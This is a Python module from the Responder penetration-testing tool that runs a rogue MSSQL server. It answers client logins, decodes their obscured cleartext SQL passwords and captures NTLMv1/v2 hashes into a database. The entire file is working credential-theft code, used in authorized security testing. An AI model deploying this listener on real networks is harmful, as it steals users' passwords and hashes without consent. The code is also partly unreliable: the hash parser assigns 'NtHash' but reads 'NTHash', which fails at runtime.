#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import struct
import settings

from SocketServer import BaseRequestHandler
from packets import MSSQLPreLoginAnswer, MSSQLNTLMChallengeAnswer
from utils import *

class TDS_Login_Packet():
	def __init__(self, data):
		
		ClientNameOff     = struct.unpack('<h', data[44:46])[0]
		ClientNameLen     = struct.unpack('<h', data[46:48])[0]
		UserNameOff       = struct.unpack('<h', data[48:50])[0]
		UserNameLen       = struct.unpack('<h', data[50:52])[0]
		PasswordOff       = struct.unpack('<h', data[52:54])[0]
		PasswordLen       = struct.unpack('<h', data[54:56])[0]
		AppNameOff        = struct.unpack('<h', data[56:58])[0]
		AppNameLen        = struct.unpack('<h', data[58:60])[0]
		ServerNameOff     = struct.unpack('<h', data[60:62])[0]
		ServerNameLen     = struct.unpack('<h', data[62:64])[0]
		Unknown1Off       = struct.unpack('<h', data[64:66])[0]
		Unknown1Len       = struct.unpack('<h', data[66:68])[0]
		LibraryNameOff    = struct.unpack('<h', data[68:70])[0]
		LibraryNameLen    = struct.unpack('<h', data[70:72])[0]
		LocaleOff         = struct.unpack('<h', data[72:74])[0]
		LocaleLen         = struct.unpack('<h', data[74:76])[0]
		DatabaseNameOff   = struct.unpack('<h', data[76:78])[0]
		DatabaseNameLen   = struct.unpack('<h', data[78:80])[0]

		self.ClientName   = data[8+ClientNameOff:8+ClientNameOff+ClientNameLen*2].replace('\x00', '')
		self.UserName     = data[8+UserNameOff:8+UserNameOff+UserNameLen*2].replace('\x00', '')
		self.Password     = data[8+PasswordOff:8+PasswordOff+PasswordLen*2].replace('\x00', '')
		self.AppName      = data[8+AppNameOff:8+AppNameOff+AppNameLen*2].replace('\x00', '')
		self.ServerName   = data[8+ServerNameOff:8+ServerNameOff+ServerNameLen*2].replace('\x00', '')
		self.Unknown1     = data[8+Unknown1Off:8+Unknown1Off+Unknown1Len*2].replace('\x00', '')
		self.LibraryName  = data[8+LibraryNameOff:8+LibraryNameOff+LibraryNameLen*2].replace('\x00', '')
		self.Locale       = data[8+LocaleOff:8+LocaleOff+LocaleLen*2].replace('\x00', '')
		self.DatabaseName = data[8+DatabaseNameOff:8+DatabaseNameOff+DatabaseNameLen*2].replace('\x00', '')

def ParseSQLHash(data, client):
	SSPIStart     = data[8:]

	LMhashLen     = struct.unpack('<H',data[20:22])[0]
	LMhashOffset  = struct.unpack('<H',data[24:26])[0]
	LMHash        = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	
	NthashLen     = struct.unpack('<H',data[30:32])[0]
	NthashOffset  = struct.unpack('<H',data[32:34])[0]
	NtHash        = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	
	DomainLen     = struct.unpack('<H',data[36:38])[0]
	DomainOffset  = struct.unpack('<H',data[40:42])[0]
	Domain        = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
	
	UserLen       = struct.unpack('<H',data[44:46])[0]
	UserOffset    = struct.unpack('<H',data[48:50])[0]
	User          = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')

	if NthashLen == 24:
		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'MSSQL', 
			'type': 'NTLMv1', 
			'client': client, 
			'user': Domain+'\\'+User, 
			'hash': LMHash+":"+NTHash, 
			'fullhash': WriteHash,
		})

	if NthashLen > 60:
		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
		
		SaveToDb({
			'module': 'MSSQL', 
			'type': 'NTLMv2', 
			'client': client, 
			'user': Domain+'\\'+User, 
			'hash': NTHash[:32]+":"+NTHash[32:], 
			'fullhash': WriteHash,
		})

def ParseSqlClearTxtPwd(Pwd):
	Pwd = map(ord,Pwd.replace('\xa5',''))
	Pw = []
	for x in Pwd:
		Pw.append(hex(x ^ 0xa5)[::-1][:2].replace("x","0").decode('hex'))
	return ''.join(Pw)

def ParseClearTextSQLPass(data, client):

	TDS = TDS_Login_Packet(data)

	SaveToDb({
		'module': 'MSSQL', 
		'type': 'Cleartext', 
		'client': client,
		'hostname': "%s (%s)" % (TDS.ServerName, TDS.DatabaseName),
		'user': TDS.UserName, 
		'cleartext': ParseSqlClearTxtPwd(TDS.Password), 
		'fullhash': TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password),
	})

# MSSQL Server class
class MSSQL(BaseRequestHandler):

	def handle(self):
		if settings.Config.Verbose:
			print text("[MSSQL] Received connection from %s" % self.client_address[0])
	
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(0.1)

				# Pre-Login Message
				if data[0] == "\x12":
					Buffer = str(MSSQLPreLoginAnswer())
					self.request.send(Buffer)
					data = self.request.recv(1024)

				# NegoSSP
				if data[0] == "\x10":
					if re.search("NTLMSSP",data):
						Packet = MSSQLNTLMChallengeAnswer(ServerChallenge=settings.Config.Challenge)
						Packet.calculate()
						Buffer = str(Packet)
						self.request.send(Buffer)
						data = self.request.recv(1024)

					else:
						ParseClearTextSQLPass(data,self.client_address[0])
				
				# NegoSSP Auth
				if data[0] == "\x11":
					ParseSQLHash(data,self.client_address[0])

		except socket.timeout:
			pass
			self.request.close()